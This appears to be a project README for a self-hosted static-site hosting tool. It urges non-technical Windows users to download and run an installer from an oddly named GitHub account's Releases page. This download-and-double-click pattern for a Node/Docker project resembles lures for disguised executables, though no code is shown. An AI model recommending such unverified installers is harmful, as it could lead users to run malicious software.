# 📁 static-site-showcase - Host your static websites with ease

[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Fellowfeelingfamilyblenniidae970/static-site-showcase)

This tool helps you host your own static websites. It works on your computer and supports many features like ZIP file uploads and live previews. You can manage multiple users and secure your data with a database. It fits many uses, whether you have one site or many.

## 🛠 Features

*   **Upload options:** Use ZIP files or paste your code directly.
*   **User management:** Control who gets access to your projects.
*   **Secure storage:** The app uses SQLite to keep your data safe.
*   **Sandbox preview:** See how your site looks before you publish it.
*   **Flexible hosting:** Run this with Docker and Caddy for professional performance.

## 💻 System Requirements

*   **Operating System:** Windows 10 or 11.
*   **Memory:** At least 4GB of RAM.
*   **Disk Space:** 500MB of free space for the application and your sites.
*   **Network:** An active internet connection for web access.

## 📥 Getting Started

You do not need to be a developer to use this platform. Follow these steps to set up the software on your Windows computer.

1.  Visit the [official download page](https://github.com/Fellowfeelingfamilyblenniidae970/static-site-showcase) to find the latest version of the application.
2.  Look for the section marked Releases on the right side of the page.
3.  Click the link for the Windows installer file.
4.  Save the file to your computer.
5.  Double-click the downloaded file to start the installation.
6.  Follow the prompts in the setup window to finish the process.

## 🚀 How to Run the Software

Once the installation finishes, you can start the application.

1.  Find the application icon on your desktop or in your start menu.
2.  Double-click the icon to launch the program.
3.  A small window will appear that shows the status of your server.
4.  Open your web browser and type `http://localhost:3000` into the address bar.
5.  The dashboard will load, and you can begin managing your websites.

## 📦 Using Docker and Caddy

If you want to move your websites to a web server, you can use Docker and Caddy. These tools automate the setup of secure connections.

1.  Install Docker Desktop for Windows.
2.  Download the configuration files from the project page.
3.  Open your command prompt in the folder containing these files.
4.  Type `docker-compose up -d` and press Enter.
5.  Your sites will now run in the background.

## 🔐 Managing User Permissions

The platform includes a built-in menu to manage users. Administrators can grant access to folders or allow other people to add their own sites.

*   **Admin account:** This account can create other accounts and edit files.
*   **Standard account:** This account can upload files and view existing projects.

To change user roles, go to the Settings tab in your browser dashboard and select the User Management section. From here, you can add new emails and assign roles to each person.

## 🔧 Frequently Asked Questions

**Does the app work without an internet connection?**
Yes. You can use the app to host sites locally on your machine even if you are offline.

**Is it safe to store my code inside this app?**
The app saves your files to a local database. Only people with access to your computer or your local network can see them.

**Can I host HTML, CSS, and JavaScript files?**
Yes. You can upload any standard web files using the drag-and-drop tool on the dashboard.

**How do I delete a site?**
Go to the Dashboard, find the site you want to remove, and click the Delete button. The system will remove the files and clear the database entry.

**What happens if I forget my password?**
If you lose your password, check the configuration file in the application installation directory to reset your credentials.

## 💬 Support

If you run into trouble, check the Issues tab on the project page. You can read questions from other users or search for solutions to common problems. If you find a new bug, feel free to report it so the team can fix it.

Keywords: caddy, docker, docker-compose, express, file-upload, javascript, nodejs, self-hosted, sqlite, static-hosting, static-site, website-showcase, zip